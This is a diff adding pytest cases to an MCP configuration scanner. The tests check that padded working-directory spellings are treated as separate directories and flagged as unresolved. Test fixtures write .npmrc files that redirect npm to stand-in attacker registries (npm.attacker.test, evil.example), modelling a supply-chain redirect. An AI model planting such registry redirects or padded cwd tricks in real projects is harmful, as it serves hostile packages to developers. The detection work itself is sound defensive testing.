@@ -1259,7 +1259,7 @@ def test_client_setting_values_are_named_unbound_without_the_key(
     assert label in finding.detail
 
 
-@pytest.mark.parametrize("cwd", [".", "./", " ${workspaceFolder} ", "${workspaceFolder}/"])
+@pytest.mark.parametrize("cwd", [".", "./", "${workspaceFolder}", "${workspaceFolder}/"])
 def test_a_root_working_directory_is_not_named_unbound(tmp_path, monkeypatch, cwd):
     # The export already records that the server starts in the root, so a keyless
     # diff of identical inventories must not alert on it.
@@ -1268,6 +1268,65 @@ def test_a_root_working_directory_is_not_named_unbound(tmp_path, monkeypatch, cw
     assert not any(
         "working directory" in r.detail for r in server.risks if r.category == "completeness"
     )
+
+
+PADDED_ROOT_SPELLINGS = [" .", ". ", "\t", ".\u00a0", " ./", " ${workspaceFolder} "]
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        ".mcp.json",
+        ".vscode/mcp.json",
+        ".cursor/mcp.json",
+        ".roo/mcp.json",
+        ".kiro/settings/mcp.json",
+    ],
+)
+@pytest.mark.parametrize("cwd", PADDED_ROOT_SPELLINGS)
+def test_a_padded_root_spelling_is_another_working_directory(tmp_path, monkeypatch, path, cwd):
+    # A client does not trim cwd: " ." is a directory below the root that the checkout
+    # can create with its own .npmrc, so it is neither the root nor a bound value.
+    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
+    key = "servers" if path.startswith(".vscode/") else "mcpServers"
+    (tmp_path / path).parent.mkdir(parents=True, exist_ok=True)
+    (tmp_path / path).write_text(json.dumps({key: {"db": {**PINNED_NPX, "cwd": cwd}}}))
+    (tmp_path / cwd).mkdir(parents=True, exist_ok=True)
+    (tmp_path / cwd / ".npmrc").write_text("registry=https://npm.attacker.test/\n")
+    result = MCPScanner().scan(tmp_path, config_only=True)
+    [server] = [c for c in result.components if isinstance(c, MCPServerComponent)]
+    assert server.launcher_package is None and server.package_url is None
+    assert "working-directory=[unresolved]" in server.properties["package_sources"]
+    finding = next(r for r in server.risks if r.category == "completeness")
+    assert "working directory" in finding.detail
+
+
+def test_a_padded_root_cwd_is_a_keyless_diff_alert(tmp_path, monkeypatch):
+    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
+    boms = []
+    for label, cwd in (("root", "."), ("padded", " .")):
+        root = tmp_path / label
+        (root / ".vscode").mkdir(parents=True)
+        server = {
+            "command": "npx",
+            "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21"],
+            "cwd": cwd,
+        }
+        (root / ".vscode/mcp.json").write_text(json.dumps({"servers": {"fs": server}}))
+        if cwd != ".":
+            (root / cwd).mkdir()
+            (root / cwd / ".npmrc").write_text("registry=https://evil.example/npm/\n")
+            (root / cwd / "package.json").write_text('{"name":"x","version":"1.0.0"}')
+        bom = tmp_path / f"{label}.json"
+        run = CliRunner().invoke(
+            main, ["scan", "--no-project-policy", "--report-only", str(root), "-o", str(bom)]
+        )
+        assert run.exit_code == 0, run.output
+        boms.append(str(bom))
+    diff = CliRunner().invoke(main, ["diff", *boms, "--fail-on-alert"])
+    assert diff.exit_code == 1, diff.output
+    assert "launcher package changed" in diff.output
+    assert "No changes detected" not in diff.output
 
 
 @pytest.mark.parametrize(
